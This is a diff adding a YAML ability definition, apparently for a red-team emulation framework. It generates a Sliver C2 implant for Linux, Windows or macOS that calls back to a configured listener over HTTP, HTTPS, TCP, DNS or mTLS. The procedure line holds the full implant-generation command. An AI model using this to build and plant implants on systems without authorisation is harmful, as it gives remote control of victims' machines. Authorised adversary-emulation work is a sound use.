@@ -1,0 +1,43 @@
+name: Generate Implant
+description: Create an implant connecting to a preconfigured listener upon execution
+tactic: Resource Development
+techniques: ["Stage Capabilities"]
+parameters:
+  PROTOCOL:
+    type: string
+    description: The protocol the implant should use to connect back to the listener
+    options: ["http", "https", "tcp", "dns", "mtls"]
+    default: "http"
+  LHOST:
+    type: string
+    description: The IP address or domain name of the listener the implant should connect to
+    default: "${LISTENER}"
+  LPORT:
+    type: int
+    description: The port of the listener the implant should connect to
+    default: ${LISTENER_PORT}
+  OS:
+    type: string
+    description: The target operating system for the implant
+    options: ["linux", "windows", "darwin"]
+    default: "linux"
+  ARCH:
+    type: string
+    description: The target architecture for the implant
+    options: ["amd64", "arm64"]
+    default: "amd64"
+  OUTPUT_PATH:
+    type: string
+    description: The path where the generated implant binary should be saved
+    default: "./implant"
+preconditions:
+  kind: C2
+procedures:
+  - key: sliver
+    tool: sliver
+    command: generate --{PROTOCOL} {LHOST}:{LPORT} --OS=${OS} --arch=${ARCH}  --save=${OUTPUT_PATH}
+effects: ["operate c2"]
+# cmd: {}
+# defend: {}
+references:
+  - https://sliver.sh/docs?name=HTTPS+C2
